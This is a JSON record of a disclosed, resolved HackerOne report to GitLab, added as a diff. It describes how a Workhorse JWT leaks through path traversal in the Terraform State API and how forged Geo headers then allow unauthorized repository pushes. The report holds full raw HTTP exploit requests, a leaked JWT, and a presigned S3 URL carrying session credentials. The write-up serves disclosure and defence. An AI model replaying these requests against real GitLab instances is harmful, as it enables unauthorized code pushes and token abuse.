@@ -1,0 +1,132 @@
+{
+  "id": 1040786,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQwNzg2",
+  "url": "https://hackerone.com/reports/1040786",
+  "title": "Exposure of a valid Gitlab-Workhorse JWT leading to various bad things",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-11-22T20:43:25.840Z",
+  "submitted_at": "2020-11-22T20:43:25.855Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ledz1996",
+    "url": "/ledz1996",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-07-05T16:28:24.784Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-07-05T16:28:24.561Z",
+  "team_member_agreed_on_going_public_at": "2021-05-21T20:10:42.514Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nUsing the **State** Uploading API we could potentially do a bad thing:\n- Bypass `Gitlab::Workhorse.verify_api_request!`\n\nThis was due to the fact that Workhorse clean the URL before passing it to Rails, this is elaborated in #923027. \nand **State** Api read `request.body` to append it as a file!\n\n**lib/api/terraform/state.rb**\n```ruby\n desc 'Add a new terraform state or update an existing one'\n          route_setting :authentication, basic_auth_personal_access_token: true, job_token_allowed: :basic_auth\n          post do\n            authorize! :admin_terraform_state, user_project\n\n            data = request.body.read\n```\nThere is one very interestingly specific exploit which I've found in my researching on Geo is to un-authorizing push to any readable repository\nSince Gitlab has a pre-receive hook which check the permission even if attacker is able to bypass the Access Control in Rails part but here is pretty interesting stuff in EE:\n\n**ee/app/controllers/ee/repositories/git_http_controller.rb**\n```ruby\ndef user\n        super || geo_push_user&.user\n      end\n\n      def geo_push_user\n        @geo_push_user ||= ::Geo::PushUser.new_from_headers(request.headers)\n      end\n```\nWhich mean the `user` for passing to Gitaly will be `user` from `geo_push_user`\n\n```ruby\n  def self.new_from_headers(headers)\n    return unless needed_headers_provided?(headers)\n\n    new(headers['Geo-GL-Id'])\n  end\n\n  def user\n    @user ||= identify_using_ssh_key(gl_id)\n  end\n```\n\nTracing from this we will reach here\n\n```ruby\n    def identify_using_ssh_key(identifier)\n      key_id = identifier.gsub(\"key-\", \"\")\n\n      identify_with_cache(:ssh_key, key_id) do\n        User.find_by_ssh_key_id(key_id)\n      end\n    end\n\n```\nThis means: I am able to authenticate as any **SSH-KEY** by just passing the ID of the Key to headers `Geo-GL-Id`\n\n### Steps to reproduce\n\nSpliting into 2 parts, **GEO** is not neccessary for the PoC but **EE** Plan should be.\n\n**Exposing Gitlab JWT**\n\n- Set up an Project\n- Get a Personal Access Token of the user\n- Send the following request \n\n```http\nPOST /api/v4/projects/<project-id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis%2fattachments?serial=1 HTTP/1.1\nHost: gitlab3.example.vm\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0\nPrivate-Token: <private-token>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryTdc8IV2vpQMwv6jW\nCookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pMWhaVGRpTFRNM05tSTBNalExWlRjNVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--64479e11c45d9e17bdf950f749ab3fa8b3ee278a; _gitlab_session=b50156c1d05716e1bebbfd448f38b890; known_sign_in=SkJhSDV0MWRqaFAyaFpZQlNCM3Vqbmg5UkxsZ0hyTHVWSlNPanNZT2YxbVQ4M2xvaUxLNkZabE9zeHdZOHlFQnloTWJxWGdPMWtKbUlkV25TNGFHRFFQVDlpdTRtUFpnTnZyd2xCTk5sS2hNRVBmODEvc2RiYVovT2RjTWgzWFQtLTY4ZEl1bXA4ZnVETVFrYnUrZVhaR1E9PQ%3D%3D--34ce6946f382229b6135333906ad3fd10ecbb284; sidebar_collapsed=false; event_filter=all\nUpgrade-Insecure-Requests: 1\nContent-Length: 316\n\n------WebKitFormBoundaryTdc8IV2vpQMwv6jW\nContent-Disposition: form-data; name=\"import_url\"\n\nhttp://gitlab3.example.vm/test/ttt\n------WebKitFormBoundaryTdc8IV2vpQMwv6jW\nContent-Disposition: form-data; name=\"mirror\"; filename=test.txt\nContent-Type: image/jpg\n\ntrue\n------WebKitFormBoundaryTdc8IV2vpQMwv6jW--\n```\n\n3. Later on send the following request \n\n```http\nGET /api/v4/projects/6/terraform/state/%2e%2e%2f%2e HTTP/1.1\nHost: gitlab3.example.vm\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0\nPrivate-Token: <Private-Token>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pMWhaVGRpTFRNM05tSTBNalExWlRjNVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--64479e11c45d9e17bdf950f749ab3fa8b3ee278a; _gitlab_session=b50156c1d05716e1bebbfd448f38b890; known_sign_in=SkJhSDV0MWRqaFAyaFpZQlNCM3Vqbmg5UkxsZ0hyTHVWSlNPanNZT2YxbVQ4M2xvaUxLNkZabE9zeHdZOHlFQnloTWJxWGdPMWtKbUlkV25TNGFHRFFQVDlpdTRtUFpnTnZyd2xCTk5sS2hNRVBmODEvc2RiYVovT2RjTWgzWFQtLTY4ZEl1bXA4ZnVETVFrYnUrZVhaR1E9PQ%3D%3D--34ce6946f382229b6135333906ad3fd10ecbb284; sidebar_collapsed=false; event_filter=all\nUpgrade-Insecure-Requests: 1\n\n```\n\nYou will then receive something like this which the JWT is in `mirror.gitlab-workhorse-upload` parameter\n\n```http\nHTTP/1.1 200 OK\nServer: nginx\nDate: Sun, 22 Nov 2020 17:45:01 GMT\nConnection: close\nCache-Control: max-age=0, private, must-revalidate\nEtag: W/\"2db9b0c1229e01c96956b4ed4ed32f3d\"\nVary: Origin\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-Request-Id: wNp4wblZQ42\nX-Runtime: 0.119849\nStrict-Transport-Security: max-age=31536000\nReferrer-Policy: strict-origin-when-cross-origin\nContent-Length: 2540\n\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"import_url\"\n\nhttp://gitlab3.example.vm/test/ttt\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.name\"\n\ntest.txt\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.path\"\n\n/opt/gitlab/embedded/service/gitlab-rails/public/uploads/tmp/test.txt403239251\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.md5\"\n\nb326b5062b2f0e69046810717534cb09\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.sha256\"\n\nb5bea41b6c623f7c09f1bf24dcae58ebab3c0cdd90ad966bc43a45b44867e12b\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.gitlab-workhorse-upload\"\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cGxvYWQiOnsibWQ1IjoiYjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDkiLCJuYW1lIjoidGVzdC50eHQiLCJwYXRoIjoiL29wdC9naXRsYWIvZW1iZWRkZWQvc2VydmljZS9naXRsYWItcmFpbHMvcHVibGljL3VwbG9hZHMvdG1wL3Rlc3QudHh0NDAzMjM5MjUxIiwicmVtb3RlX2lkIjoiIiwicmVtb3RlX3VybCI6IiIsInNoYTEiOiI1ZmZlNTMzYjgzMGYwOGEwMzI2MzQ4YTkxNjBhZmFmYzhhZGE0NGRiIiwic2hhMjU2IjoiYjViZWE0MWI2YzYyM2Y3YzA5ZjFiZjI0ZGNhZTU4ZWJhYjNjMGNkZDkwYWQ5NjZiYzQzYTQ1YjQ0ODY3ZTEyYiIsInNoYTUxMiI6IjkxMjBjZDVmYWVmMDdhMDhlOTcxZmYwMjRhM2ZjYmVhMWUzYTZiNDQxNDJhNmQ4MmNhMjhjNmM0MmU0Zjg1MjU5NWJjZjUzZDgxZDc3NmYxMDU0MTA0NWFiZGI3YzM3OTUwNjI5NDE1ZDBkYzY2YzhkODZjNjRhNTYwNmQzMmRlIiwic2l6ZSI6IjQifSwiaXNzIjoiZ2l0bGFiLXdvcmtob3JzZSJ9.xvDjfRCxUK1bfLyM97sxiORbKmGLBr5Tte2c7ywSGz0\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.remote_id\"\n\n\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.size\"\n\n4\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.remote_url\"\n\n\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.sha512\"\n\n9120cd5faef07a08e971ff024a3fcbea1e3a6b44142a6d82ca28c6c42e4f852595bcf53d81d776f10541045abdb7c37950629415d0dc66c8d86c64a5606d32de\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.sha1\"\n\n5ffe533b830f08a0326348a9160afafc8ada44db\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a--\n\n```\n\nTake note of this value\n\n**Unauthorizing push to readable project**\nAssuming:\n\nUser B has Project B set public or internal without any user can push.\nUser B upload an SSH-KEY.\n\n- Login as another user.\n- Navigate to project B that you don't have the push access.\n- Fork the project\n- Clone the forked project using HTTP\n- Push any file to the Project but intercept the request\n\nWhen sending the request to `<project-forked-path>.git/git-receive-pack`\nChange the path from  `<project-forked-path>.git/git-receive-pack` to `/-/push_from_secondary/2/<project-path>.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack `\nAdding the `Gitlab-Workhorse-Api-Request` Header with the value is the value noted in the first part\nAdding the `Geo-GL-Id` with the value `key-<id>` with `<id>` as the ID of any key of a user who has push access to the project which is user B, This could be brute-forced as it is incremental integer from 1.\nThe request should look likes\n\n```http\nPOST /-/push_from_secondary/2/rrr/dsds.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack HTTP/1.1\nHost: gitlab3.example.vm\nGeo-GL-Id: key-1\nUser-Agent: git/2.28.0\nAccept-Encoding: gzip, deflate\nGitlab-Workhorse-Api-Request: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cGxvYWQiOnsibWQ1IjoiYjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDkiLCJuYW1lIjoidGVzdC50eHQiLCJwYXRoIjoiL29wdC9naXRsYWIvZW1iZWRkZWQvc2VydmljZS9naXRsYWItcmFpbHMvcHVibGljL3VwbG9hZHMvdG1wL3Rlc3QudHh0NDAzMjM5MjUxIiwicmVtb3RlX2lkIjoiIiwicmVtb3RlX3VybCI6IiIsInNoYTEiOiI1ZmZlNTMzYjgzMGYwOGEwMzI2MzQ4YTkxNjBhZmFmYzhhZGE0NGRiIiwic2hhMjU2IjoiYjViZWE0MWI2YzYyM2Y3YzA5ZjFiZjI0ZGNhZTU4ZWJhYjNjMGNkZDkwYWQ5NjZiYzQzYTQ1YjQ0ODY3ZTEyYiIsInNoYTUxMiI6IjkxMjBjZDVmYWVmMDdhMDhlOTcxZmYwMjRhM2ZjYmVhMWUzYTZiNDQxNDJhNmQ4MmNhMjhjNmM0MmU0Zjg1MjU5NWJjZjUzZDgxZDc3NmYxMDU0MTA0NWFiZGI3YzM3OTUwNjI5NDE1ZDBkYzY2YzhkODZjNjRhNTYwNmQzMmRlIiwic2l6ZSI6IjQifSwiaXNzIjoiZ2l0bGFiLXdvcmtob3JzZSJ9.xvDjfRCxUK1bfLyM97sxiORbKmGLBr5Tte2c7ywSGz0\nContent-Type: application/x-git-receive-pack-request\nAccept: application/x-git-receive-pack-result\nContent-Length: 436\nConnection: close\n\n00a822cc76ea883341147a10ad83f9994bb9a89d79d9 02c1e26f4d449d265e87e2906933ff0a2a5f275d refs/heads/master report-status side-band-64k object-format=sha1 agent=git/2.28.00000PACK\u0002\u0003\fxËA\nB!\u0010Ð½§p\u001fóõ;\u000eDtö-gt¢ óc\nuûºBÛ\u0007otU[\" q(IYÐ«EsE¨dÌ(´*Ù¸ësØeÉ\u0019£rJÞ\u0007\fKòW\"\n\"Ä\nR!ÃsÜZ·6»=sU{ø´yÒ7×í¡ûÜêÑBtÑ!ø°ÚCçÌOë}\fý³¡¯a¾kå=Õú\u0002s\u000eVOæ\u0001me²6\n\bAz^×ÿ\u000eÜTx\u0001*Õÿ\u0002»\u0002Ó lll2332.txt¨'FÛN^ÁÎZÐpå}Í\"¶Ü¿³ÐÌHt!\u0014\u00024x+))á\u0002\u0004\"\u0001gøÈÎ.LG^gßyg\u0019ßÿ\fæ5,\n```\n\nVideo:\nSorry had to tone down the size because of 256 mb limit :( \n\n{F1090024}\n\n###Results of GitLab environment info\n\n```\nSystem information\nSystem:     Ubuntu 16.04\nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.6.6p146\nGem Version:    2.7.10\nBundler Version:1.17.3\nRake Version:   12.3.3\nRedis Version:  5.0.9\nGit Version:    2.28.0\nSidekiq Version:5.2.9\nGo Version: unknown\n\nGitLab information\nVersion:    13.5.3-ee\nRevision:   b9d194b6b91\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 11.9\nURL:        http://gitlab.example.vm\nHTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git\nSSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git\nElasticsearch:  no\nGeo:        no\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    13.11.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nUnauthorized push to repositories, exposing Workhorse JWT",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1090024,
+      "file_name": "Screen_Recording_2020-11-23_at_03.21.28.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b4sqs8kqf7jkbxh2wqfdos9v6hmr?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2020-11-23_at_03.21.28.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2020-11-23_at_03.21.28.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCTLAZYO%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151045Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCICvDTKJUgIl%2Bq83LvpeoLVNAK%2Fknu%2B8YUfJlKUoo48BiAiAHUMZuidqQGWZFepCXdjX1mFlRVhT0VT7YgDhSZP92kSq6BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNPL5bO5Z3alMXqRFKo4F4fBDy5oEITbcGbidgiv2X2t2a0NKYCb6ai4gPP77bYVo6i7gR7BG4vO9XJDbLMUklSyeDIhNl6NuuRjLl%2FJgd1VMJA1b53xukmdwXGb4rUbWiFoIExz0EWC%2BkT2XtAnB5mtw%2B%2BwqAMJjzITsjP%2BWWXD5i6dZHGW6mRNlZywimS79PZFEEj9gJvMkkHKpCYJu5UzhF3THASIExyqBbCsB401NNUR3QRxSwolUbKlu6BtZV3XRb27eXsFmzx7KPBm1xeSmIDgjKOmjHmFWkg%2BbaNG%2FfwsvWIeRFBoheEraVzCQfXweGJV2YdgNhKww9uRldIBilV962qk24%2BuNpmu3qsfr7fcef2P%2By1D%2B%2FytfZGRfZuiwBlmogRnG1LQvSDhEV1sV%2FrvmKi8ux7a%2BPLUFhWNkJB7%2F9ep8JPfmgTfy0hEbMSWIck5cNSt%2Fgko1ENIge83bR7nmp6%2BROFwrAwwd1lnGyZRY9OZEBnLRMQvoalcKydaa4wqSQDmH6GqoZZXm4WSJE3617MWydbKgk8W3ItafEuhIAHSofhuNdj6Ynl8mk6H8rgLzbOdbidcnnNOdcqipN5DED10whJlSnUwRsQBmSxN6p%2FmBApFCIkZQWtdYAZQDNltgGocyTSkXRe3HKn0hZGVUouuBIQvOtE5EMrscGNIFt3FATktVwSzZ%2FA6xkzaL9Qh6hu9XVmXCTdOuKSlaBHDiSfzYKJ1vTDqIBsSSU5nbYiSd9IAR8Yp3xyzGRfZxZQsvYTSxLAPELduG%2FV19MEEqUTy2gwKAnX4ZN0u5sG0Q%2BRfE1drrjnmU0tyUGOYAeLG5HqQQvfXGtmzgytHLuKTyI1tmN8lwj%2FsJW2FE7YvwVE4iiVZw3jsaMM6L%2Fc8GOrIBvO8cwwltCM4AdpQm9fgxmw5xylTv3zg9giXb3OYWLXKRgnJlEHrAmDmi6bvrYvpiQq2dmMClKLu7JhdGbhneuiiX6el3NvvQUzBssd2Fv3n1sfwbUtXe9%2BeDCMpN6l8qKlRTK27efoDAHuuBXAWX8nkjKDl7MjO%2BWDkCNHCGCyndZgpNGi1h6qtrSmHQTTOou5pX0%2BLnE%2Bb7rtMOkNB4k2pm81UBSOP7SpMpRgGnW%2FyM2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4ae0aac68442b32cca38cd5a3eeba1fd26bf22f45c1848f57bb51feed3cc9564",
+      "file_size": 145417325,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 33,
+  "voters": [
+    "n1m0",
+    "drsniper",
+    "haxor31337",
+    "thruster",
+    "zy9ard3",
+    "run_win",
+    "red_darkin",
+    "isira_adithya",
+    "kmxx",
+    "huntinex",
+    "and 23 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 39022,
+    "asset_type": "OTHER",
+    "asset_identifier": "Your Own GitLab Instance",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
